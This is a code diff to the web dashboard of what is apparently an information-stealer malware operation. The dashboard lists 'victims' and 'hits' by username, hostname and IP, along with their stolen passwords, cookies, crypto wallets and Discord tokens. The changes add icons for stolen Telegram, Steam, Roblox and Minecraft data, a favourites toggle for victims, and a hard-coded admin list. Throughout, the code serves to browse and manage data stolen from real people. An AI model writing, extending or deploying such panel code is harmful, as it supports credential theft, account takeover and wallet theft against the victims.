@@ -1031,6 +1031,7 @@
                     <a href="builder.html" class="sidebar-link"><i class="fas fa-code"></i> Builder</a>
                     <a href="leaderboard.html" class="sidebar-link"><i class="fas fa-trophy"></i> Leaderboard</a>
                     <a href="account.html" class="sidebar-link"><i class="fas fa-circle-user"></i> Account</a>
+                    <a href="admin.html" class="sidebar-link" id="adminLink" style="display:none;"><i class="fas fa-user-shield"></i> Admin Panel</a>
                 </div>
             </div>
         </nav>
@@ -1084,6 +1085,9 @@
     </div>
 
     <script>
+        const ADMIN_USERS = [
+            'fb0addca-1742-4fc3-9ff8-a2eb43ab66e7',
+        ];
         (function() {
             if (typeof window.__sbClient === 'undefined') {
                 const SUPABASE_URL = "https://zjtkdztrwqrjqquygtbr.supabase.co";
@@ -1117,6 +1121,52 @@
                     return !isSensitive && !isFileEntry && !isInvalid;
                 });
             }
+            function getAppIcons(victim) {
+            const data = safeParseData(victim.data);
+            const apps = [];
+                    
+            // Helper to generate an icon wrapper
+            function makeAppIcon(name, fileName) {
+                const safeName = encodeURIComponent(fileName.toLowerCase());
+                const imgSrc = `/scripty/icons/small/apps/${safeName}.png`;
+                return `<div class="icon-img-wrapper">
+                    <img src="${imgSrc}" alt="${name}" class="icon-img" data-name="${name}"
+                         onerror="console.warn('icon failed:', this.src); this.style.display='none'; this.parentElement.querySelector('.icon-img-fallback').style.display='flex'">
+                    <div class="icon-img-fallback">${getInitials(name)}</div>
+                </div>`;
+            }
+        
+            // Discord
+            if (data.tokens && data.tokens.length > 0) {
+                apps.push(makeAppIcon('Discord', 'discord'));
+            }
+            // Telegram
+            if (data.telegram === true) {
+                apps.push(makeAppIcon('Telegram', 'telegram'));
+            }
+            // Steam
+            if (data.steam && data.steam.account_name) {
+                apps.push(makeAppIcon('Steam', 'steam'));
+            }
+            // Roblox
+            if (data.roblox && data.roblox.name) {
+                apps.push(makeAppIcon('Roblox', 'roblox'));
+            }
+            // Minecraft
+            if (data.additionalFiles && Array.isArray(data.additionalFiles)) {
+                const hasMinecraft = data.additionalFiles.some(f =>
+                    f.fileName && f.fileName.toLowerCase().includes('minecraft')
+                );
+                if (hasMinecraft) {
+                    apps.push(makeAppIcon('Minecraft', 'minecraft'));
+                }
+            }
+        
+            if (apps.length === 0) {
+                return '<span class="text-muted">—</span>';
+            }
+            return `<div class="icon-group">${apps.join('')}</div>`;
+        }
 
             // Convert full country name to ISO 2-letter code (approximate)
             function getCountryCode(countryName) {
@@ -1272,10 +1322,10 @@
                 const end = Math.min(start + PAGE_SIZE, filteredVictims.length);
                 const pageData = filteredVictims.slice(start, end);
                 const container = document.getElementById('hitsContainer');
-
+            
                 document.getElementById('hitsCount').textContent =
                     `Page ${currentPage} of ${Math.ceil(filteredVictims.length / PAGE_SIZE) || 1} · ${filteredVictims.length} hits`;
-
+            
                 if (pageData.length === 0) {
                     container.innerHTML = `
                         <div class="empty-state">
@@ -1286,7 +1336,7 @@
                     `;
                     return;
                 }
-
+            
                 let html = `
                     <div class="top-scrollbar"><div class="top-scrollbar-inner"></div></div>
                     <div class="hits-table-wrap">
@@ -1308,19 +1358,16 @@
                             </thead>
                             <tbody>
                 `;
-
+                            
                 pageData.forEach((v, idx) => {
                     const data = safeParseData(v.data);
                     const filteredPasswords = filterPasswords(data);
                     const cookies = data.cookies || [];
                     const wallets = data.wallets || {};
                     const walletNames = Object.keys(wallets);
-                    const apps = data.apps || [];
-
-                    // 🔥 Use the enhanced extractor instead of raw data.browsers
+                
                     const browserNames = extractBrowserNames(data);
-                    console.log(`[renderTable] row ${idx} browserNames:`, browserNames);
-
+                
                     const username = v.username || 'Unknown';
                     const pcName = v.hostname || 'N/A';
                     const ip = v.ip || 'N/A';
@@ -1331,10 +1378,13 @@
                     const env = data.executionEnvironment || 'EXE';
                     const mcUsername = data.minecraftUsername || null;
                     const isMcInvalid = data.minecraftInvalid || false;
-
+                
                     const favourites = v.favourite || false;
                     const time = v.timestamp || new Date().toISOString();
-
+                
+                    // --- Generate Apps icons ---
+                    const appIcons = getAppIcons(v);
+                
                     html += `
                         <tr data-uuid="${v.id}">
                             <td>
@@ -1363,7 +1413,7 @@
                                 ${renderIconGroup(walletNames, 'Wallets')}
                             </td>
                             <td class="icon-cell">
-                                ${renderIconGroup(apps, 'Apps')}
+                                ${appIcons}
                             </td>
                             <td>
                                 <button class="fav-btn ${favourites ? 'fav-active' : ''}" onclick="window.toggleFavourite('${v.id}')" title="${favourites ? 'Remove from favourites' : 'Add to favourites'}">
@@ -1395,14 +1445,14 @@
                         </tr>
                     `;
                 });
-
+            
                 html += `
                             </tbody>
                         </table>
                     </div>
                 `;
                 container.innerHTML = html;
-
+                
                 setupTopScrollbar();
                 setupIconTooltips();
             }
@@ -1552,17 +1602,31 @@
             window.toggleFavourite = async function(id) {
                 try {
                     const victim = allVictims.find(v => v.id === id);
-                    if (!victim) return;
-                    const newState = !victim.favourite;   // ← changed here
-                    const { error } = await supabaseClient
+                    if (!victim) {
+                        console.warn('Victim not found locally');
+                        return;
+                    }
+                    const newState = !victim.favourite;
+                    const { data, error } = await supabaseClient
                         .from('victims')
-                        .update({ favourite: newState })   // ← changed here
-                        .eq('id', id);
-                    if (error) throw error;
-                    victim.favourite = newState;           // ← changed here
-                    applyFiltersAndSearch();
-                    showToast(newState ? 'Added to favourites' : 'Removed from favourites');
+                        .update({ favourite: newState })
+                        .eq('id', id)
+                        .select(); // this returns the updated row
+                
+                    if (error) {
+                        console.error('Supabase error:', error);
+                        showToast('Error: ' + error.message, 'error');
+                        return;
+                    }
+                    if (data && data.length > 0) {
+                        victim.favourite = data[0].favourite;
+                        await fetchData(); // refresh the list
+                        showToast(newState ? 'Added to favourites' : 'Removed');
+                    } else {
+                        showToast('Row not found – check RLS', 'error');
+                    }
                 } catch (err) {
+                    console.error(err);
                     showToast('Error: ' + err.message, 'error');
                 }
             };
@@ -1695,6 +1759,10 @@
                     }
                 }
                 checkVip(currentUser.id);
+                const adminLink = document.getElementById('adminLink');
+                if (adminLink && ADMIN_USERS.includes(currentUser.id)) {
+                    adminLink.style.display = 'flex';
+                }
 
                 const user = session.user;
                 const { data: profile, error: profileError } = await supabaseClient
